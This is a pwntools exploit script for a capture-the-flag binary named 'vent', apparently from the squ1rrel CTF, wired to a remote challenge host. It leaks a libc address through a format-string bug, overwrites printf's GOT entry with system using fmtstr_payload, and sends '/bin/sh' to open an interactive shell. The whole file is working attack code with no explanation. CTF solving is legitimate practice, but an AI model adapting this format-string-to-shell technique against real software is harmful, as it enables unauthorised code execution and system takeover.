from pwn import *
from icecream import ic

elf = exe = ELF("./vent_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("vent.squ1rrel-ctf-codelab.kctf.cloud", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x000000000040122a
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

payload = "%43$p"
sl(payload)
ru("You said:\n")

libc.address = int(re(14).decode(), 16) - 0x24083
ic(hex(libc.address))

# payload = "%34$p"
# sl(payload)
# ru("You said:\n")

# stack_leak = int(re(14).decode(), 16) - 0xee
# ic(hex(stack_leak))

payload = fmtstr_payload(8, {elf.got['printf'] : libc.symbols['system']})
sl(payload)

# payload = p64(stack_leak)
payload = b'/bin/sh\x00'
sl(payload)
i()

